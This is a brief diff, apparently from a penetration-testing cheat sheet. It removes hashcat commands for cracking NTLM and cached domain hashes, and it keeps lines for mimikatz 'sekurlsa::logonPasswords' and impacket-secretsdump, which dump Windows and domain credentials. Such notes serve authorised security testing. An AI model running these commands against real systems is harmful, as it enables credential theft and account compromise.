@@ -71,8 +71,4 @@ mimikatz # `sekurlsa::logonPasswords`
 
 
 
-`hashcat -m 1000 <HASH> <PASSLIST> --potfile-disable`
-`hashcat -m 2100 <HASH> <PASSLIST> --potfile-disable`
-
-
 `impacket-secretsdump '<DOMAIN>/<USER>:<PASS>@<IP>'`
